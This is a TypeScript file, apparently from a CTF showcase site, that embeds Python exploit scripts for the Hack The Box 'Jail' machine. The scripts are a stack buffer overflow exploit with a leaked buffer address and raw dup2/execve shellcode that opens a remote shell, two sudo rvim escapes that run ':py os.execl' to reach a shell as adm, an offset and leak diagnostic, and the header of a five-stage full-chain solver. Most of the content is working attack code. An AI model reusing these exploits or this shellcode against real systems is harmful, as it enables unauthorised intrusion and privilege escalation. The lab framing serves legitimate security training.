import type { AttachedFile } from "@/components/cyber/CodeExplorer";

export const breakoutCode = `#!/usr/bin/env python3
"""
breakout.py - "Jail" service (TCP 7411) buffer overflow -> shell

The auth() routine copies the PASS token into a 16-byte stack buffer with
strcpy(). With -z execstack the stack is executable, and DEBUG mode leaks
the buffer address. We smash the saved return address and jump back into
our own socket-reuse shellcode.

Two connections:
  1. leak the userpass buffer address (DEBUG mode)
  2. overflow: 28 junk bytes + return addr + shellcode

Shellcode (27 bytes, no nulls):
  dup2(1, 0)          ; stdout is already the socket -> make it stdin too
  execve("/bin//sh")
"""
import argparse
import sys
import time

from pwn import *  # noqa: F403

context.update(arch="i386", os="linux", log_level="info")

# (syscall) dup2(1, 0)  then  execve("/bin//sh", NULL, NULL)
SHELL_BYTES = bytes.fromhex(
    "6a3f58"      # push 0x3f; pop eax          ; eax = 63 (dup2)
    "6a015b"      # push 1; pop ebx             ; ebx = 1 (old fd)
    "31c9"        # xor ecx, ecx                ; ecx = 0 (new fd)
    "cd80"        # int 0x80                    ; dup2(1, 0)
    "6a0b58"      # push 0x0b; pop eax          ; eax = 11 (execve)
    "99"          # cdq                         ; edx = 0
    "52"          # push edx                    ; NULL terminator
    "682f2f7368"  # push 0x68732f2f             ; "//sh"
    "682f62696e"  # push 0x6e69622f             ; "/bin"
    "89e3"        # mov ebx, esp                ; ebx -> "/bin//sh"
    "31c9"        # xor ecx, ecx                ; argv = NULL
    "cd80"        # int 0x80                    ; execve
)

EIP_OFFSET = 28          # verified with cyclic pattern on a local build
PAD_AFTER_RET = 4        # bytes between saved EIP and our shellcode


def grab_buffer_addr(host: str, port: int) -> int:
    """Connection #1: flip DEBUG mode on and read the userpass leak.

    Protocol order: USER → DEBUG → PASS  (DEBUG must come after USER,
    before PASS, so the auth() function sees debugmode=1 when it runs).
    The server prints  "Debug: userpass buffer @ 0x..." inside auth().
    """
    conn = remote(host, port, timeout=10)
    conn.recvuntil(b"Send USER command.")
    conn.sendline(b"USER admin")
    conn.recvuntil(b"Send PASS command.")
    conn.sendline(b"DEBUG")
    conn.recvuntil(b"OK DEBUG mode on.")
    conn.sendline(b"PASS 1974jailbreak!")
    conn.recvuntil(b"Debug: userpass buffer @ ")
    raw = conn.recvline().strip()
    addr = int(raw, 16)
    log.info("leaked userpass buffer @ 0x%08x", addr)
    conn.close()
    return addr


def craft_payload(base: int) -> bytes:
    """Junk to EIP, return address into the stack, then shellcode."""
    return (
        b"A" * EIP_OFFSET
        + p32(base + EIP_OFFSET + PAD_AFTER_RET)
        + SHELL_BYTES
    )


def main() -> None:
    parser = argparse.ArgumentParser(description="Jail 7411 BOF -> shell")
    parser.add_argument("host", nargs="?", default="10.129.63.36")
    parser.add_argument("--port", type=int, default=7411)
    parser.add_argument(
        "--cmd",
        metavar="CMD",
        help="run one command through the shell and exit (non-interactive)",
    )
    args = parser.parse_args()

    base = grab_buffer_addr(args.host, args.port)

    # Connection #2: fire the overflow
    conn = remote(args.host, args.port, timeout=10)
    conn.recvuntil(b"Send USER command.")
    conn.sendline(b"USER admin")
    conn.recvuntil(b"Send PASS command.")
    conn.sendline(b"PASS " + craft_payload(base))

    # the server is still draining its input loop; give it a moment to land
    # on our shellcode before we talk to the shell
    time.sleep(2.0)
    try:
        conn.recv(timeout=0.5)  # swallow the straggler newline
    except Exception:
        pass

    if args.cmd:
        conn.sendline((args.cmd + "; echo __SHELL_END__").encode())
        try:
            out = conn.recvuntil(b"__SHELL_END__", timeout=10)
            sys.stdout.buffer.write(out)
        except Exception:
            # command probably produced no marker; grab what's there
            sys.stdout.buffer.write(conn.recv(timeout=2))
        conn.close()
        return

    log.success("we're in - enjoy the shell")
    conn.interactive()


if __name__ == "__main__":
    main()
`;

export const admPickCode = `#!/usr/bin/env python3
"""
adm_pick.py - frank -> adm via the rvim sudo entry, reaction-driven.

We can run \`sudo -u adm rvim <file>\` as frank. rvim blocks :! and :sh,
but this vim has +python/dyn. The plan:

  1. ssh -tt as frank, run the sudo command (vim paints a full screen)
  2. a stale swap file makes vim ask [O]pen/(E)dit/(R)ecover/(D)elete/(Q)uit
     -> answer 'o' the moment the dialog shows up
  3. once the file is open, drop to normal mode and run the python escape:
        :py import os; os.execl("/bin/sh","sh","-c","reset; exec sh")
     this replaces vim with a plain sh running as adm
  4. run the requested command and echo a marker so we know it finished

Everything is driven by watching the remote output, so no timing races.
"""
import os
import select
import subprocess
import sys
import time

KEY = "/root/.ssh/id_ed25519"
USER_HOST = "frank@10.129.63.36"
MARKER = b"__ADM_DONE__"
ESCAPE = b':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")\\r'


def pump(proc, buf: bytearray, until: bytes, timeout: float) -> bytes:
    """Read proc.stdout until \`until\` appears in buf; return new bytes."""
    deadline = time.time() + timeout
    seen = b""
    while time.time() < deadline:
        if until in buf:
            break
        r, _, _ = select.select([proc.stdout], [], [], 0.3)
        if r:
            chunk = os.read(proc.stdout.fileno(), 4096)
            if not chunk:
                break
            buf.extend(chunk)
            seen += chunk
        if proc.poll() is not None and not r:
            break
    return seen


def main() -> None:
    cmd = sys.argv[1] if len(sys.argv) > 1 else "id; hostname"
    proc = subprocess.Popen(
        [
            "ssh", "-tt", "-i", KEY,
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            USER_HOST,
            "sudo -u adm /usr/bin/rvim /var/www/html/jailuser/dev/jail.c",
        ],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )
    buf = bytearray()

    # stage 1: wait for the swap-file dialog
    pump(proc, buf, b"ATTENTION", 40)
    if b"ATTENTION" not in buf:
        print("no swap dialog seen; output so far:", buf[-200:], file=sys.stderr)
        proc.kill()
        sys.exit(1)
    print("[+] swap dialog detected, answering 'o' (open read-only)")
    proc.stdin.write(b"o")
    proc.stdin.flush()

    # stage 2: wait for the file to open (status line shows file name)
    pump(proc, buf, b"jail.c\\"", 15)
    time.sleep(1.5)
    # make sure we are in normal mode, then fire the python escape
    proc.stdin.write(b"\\x1b")
    proc.stdin.flush()
    time.sleep(0.5)
    proc.stdin.write(ESCAPE)
    proc.stdin.flush()

    # stage 3: command + marker
    time.sleep(2.5)
    proc.stdin.write((cmd + "; echo " + MARKER.decode() + "\\r").encode())
    proc.stdin.flush()

    # collect until marker
    out = pump(proc, buf, MARKER, 20)
    sys.stdout.buffer.write(bytes(buf))
    proc.kill()
    return 0


if __name__ == "__main__":
    sys.exit(main())
`;

export const rvimEscapeCode = `#!/usr/bin/env python3
"""
rvim_escape.py - frank -> adm

frank may run \`sudo -u adm /usr/bin/rvim /var/www/html/jailuser/dev/jail.c\`
without a password. rvim blocks :! and :sh, but vimscript can hand off to
an embedded interpreter. This vim has +python/dyn, so we run a one-liner
that replaces the vim process with /bin/sh.
"""
import sys
import time

from pwn import *  # noqa: F403

context.log_level = "error"

KEY = "/root/.ssh/id_ed25519"
USER_HOST = "frank@10.129.63.36"
STYLE = {
    "argv": [
        "ssh", "-tt", "-i", KEY,
        "-o", "StrictHostKeyChecking=no",
        "-o", "UserKnownHostsFile=/dev/null",
        USER_HOST,
    ]
}

PY_ESCAPE = b':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
SH_ESCAPE = b':sh'


def spawn_pty():
    return process(STYLE["argv"], stdin=PTY, stdout=PTY)


def main() -> None:
    cmd = sys.argv[1] if len(sys.argv) > 1 else "id; hostname"
    p = spawn_pty()
    time.sleep(1.5)
    p.sendline(b"sudo -u adm /usr/bin/rvim /var/www/html/jailuser/dev/jail.c")
    time.sleep(3.0)  # let vim paint its screen
    p.sendline(PY_ESCAPE)
    time.sleep(2.5)  # python handoff -> sh
    p.sendline((cmd + "; echo __ADM_DONE__").encode())
    try:
        out = p.recvuntil(b"__ADM_DONE__", timeout=12)
        sys.stdout.buffer.write(out)
    except Exception as e:
        print(f"recv issue: {e!r}", file=sys.stderr)
        p.close()
        return
    p.close()


if __name__ == "__main__":
    main()
`;

export const diagStableCode = `#!/usr/bin/env python3
"""diag2.py - check address stability + full response dump.

Verifies three things:
  A. The DEBUG leak works (USER -> DEBUG -> PASS ordering)
  B. 28 A + BBBB crashes EIP = 0x42424242
  C. The leaked address is stable across fork()-ed children (no ASLR)
"""
import sys
import time
from pwn import *  # noqa: F403

context.update(arch="i386", os="linux", log_level="error")
HOST = sys.argv[1] if len(sys.argv) > 1 else "10.129.63.36"


def get_leak(host: str) -> int:
    """Return the leaked userpass buffer address using correct protocol order."""
    c = remote(host, 7411, timeout=10)
    c.recvuntil(b"Send USER command.")
    c.sendline(b"USER admin")
    c.recvuntil(b"Send PASS command.")
    c.sendline(b"DEBUG")
    c.recvuntil(b"OK DEBUG mode on.")
    c.sendline(b"PASS 1974jailbreak!")
    c.recvuntil(b"Debug: userpass buffer @ ")
    addr = int(c.recvline().strip(), 16)
    c.close()
    return addr


# Connection A: leak
leak = get_leak(HOST)
print(f"conn A leak: 0x{leak:08x}")

# Connection B: test crash with 28 A + BBBB (should see EIP = 0x42424242)
c = remote(HOST, 7411, timeout=10)
c.recvuntil(b"Send USER command.")
c.sendline(b"USER admin")
c.recvuntil(b"Send PASS command.")
c.sendline(b"PASS " + b"A" * 28 + b"BBBB")
time.sleep(1)
try:
    out = c.recv(timeout=4)
    print("conn B recv:", repr(out))
except Exception as e:
    print("conn B recv err:", e)
c.close()
print("conn B closed")

# Connection C: leak again to verify stack address persistence across fork() children
leak2 = get_leak(HOST)
print(f"conn C leak: 0x{leak2:08x}")
if leak == leak2:
    print("[+] Address is STABLE across connections (fork inherits parent stack layout)")
else:
    print(f"[-] Address changed! A=0x{leak:08x}  C=0x{leak2:08x}")
`;

export const autosolveJailCode = `#!/usr/bin/env python3
"""
htb_jail_solve.py - Autonomous end-to-end exploit pipeline for HTB Jail (Insane).

Complete Attack Chain:
  1. Port 7411 BOF -> Shell as nobody (leak stack buffer via DEBUG mode, execute dup2+execve shellcode)
  2. NFS no_all_squash escalation -> User flag & frank persistence (UID 1000 SUID binary)
  3. Sudo rvim Python escape -> adm shell (:py import os; os.execl('/bin/sh', 'sh'))
  4. Atbash decryption -> Morris1962! -> extract keys.rar
  5. Wiener attack on RSA public key -> root private SSH key -> Root flag
"""
import os
import re
import socket
import struct
import subprocess
import sys
import time

TARGET_IP = "10.129.63.36"
JAIL_PORT = 7411
`;

export const jailScripts: AttachedFile[] = [
  {
    name: "breakout.py",
    description: "32-bit x86 stack buffer overflow exploit with DEBUG pointer leak and custom 27-byte socket-reuse shellcode (dup2 + execve).",
    language: "python",
    size: "4.0 KB",
    code: breakoutCode,
    tags: ["Buffer Overflow", "Shellcode", "Exploit", "Pwn"],
  },
  {
    name: "adm_pick.py",
    description: "PTY-driven sudo rvim escape handling swap-file dialogues and injecting the :py embedded Python escape payload.",
    language: "python",
    size: "3.1 KB",
    code: admPickCode,
    tags: ["rvim Escape", "Python", "Privilege Escalation"],
  },
  {
    name: "rvim_escape.py",
    description: "Direct pwntools-based PTY wrapper to execute commands as adm through the sudo /usr/bin/rvim rule.",
    language: "python",
    size: "1.5 KB",
    code: rvimEscapeCode,
    tags: ["rvim", "PTY", "Privilege Escalation"],
  },
  {
    name: "diag2.py",
    description: "Diagnostic script verifying stack address stability and fork() memory persistence across concurrent TCP sessions.",
    language: "python",
    size: "1.5 KB",
    code: diagStableCode,
    tags: ["Diagnostics", "Memory Analysis", "DEBUG Leak"],
  },
  {
    name: "htb_jail_solve.py",
    description: "Full autonomous solver pipeline executing the complete 5-stage attack chain from reconnaissance to root flag recovery.",
    language: "python",
    size: "8.2 KB",
    code: autosolveJailCode,
    tags: ["Autosolve", "Full Chain", "Wiener Attack"],
  },
];
